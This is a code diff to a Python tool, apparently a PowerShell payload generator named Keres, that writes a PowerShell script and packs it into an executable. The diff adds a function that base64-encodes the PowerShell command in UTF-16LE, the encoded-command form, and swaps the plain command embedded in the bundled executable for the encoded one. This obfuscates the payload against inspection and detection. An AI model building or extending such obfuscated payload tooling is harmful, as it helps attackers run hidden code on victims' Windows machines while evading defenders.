@@ -6,6 +6,7 @@ import random
 import subprocess
 import sys
 import platform
+import base64
 
 def display_ansi_art(file_path):
     with open(file_path, 'r', encoding='latin-1') as file:
@@ -40,7 +41,14 @@ def create_exe(py_file):
         print("Executable created successfully.")
     except Exception as e:
         print("An error occurred:", str(e))
+def encode_powershell_command(command):
+    # """"""""""""""
+    command_bytes = command.encode('utf-16-le')
 
+    #" """"""""""""""""""""""""""""""""
+    encoded_command = base64.b64encode(command_bytes).decode('utf-8')
+
+    return encoded_command
 def main():
     colorama.init(autoreset=True)  # Initialize colorama for Windows
     ans_directory = 'banners'
@@ -91,6 +99,7 @@ def main():
         }} 
         Start-Sleep -Seconds 10 
     }}'''
+    encoded_ps_command = encode_powershell_command(ps_command)
     if args.save_ps_command:
         ps_file_path = os.path.join("Output", "Keres.ps1")
         with open(ps_file_path, 'w') as ps_file:
@@ -104,7 +113,7 @@ def main():
         bundle_dir = sys._MEIPASS
     else:
         bundle_dir = os.path.abspath(".")
-    pewpew=ps_command
+    pewpew=encoded_ps_command
     paw_path = os.path.join(bundle_dir, 'pewpew.py')
     with open(paw_path, 'r') as paw_file:
         paw_contents = paw_file.read()
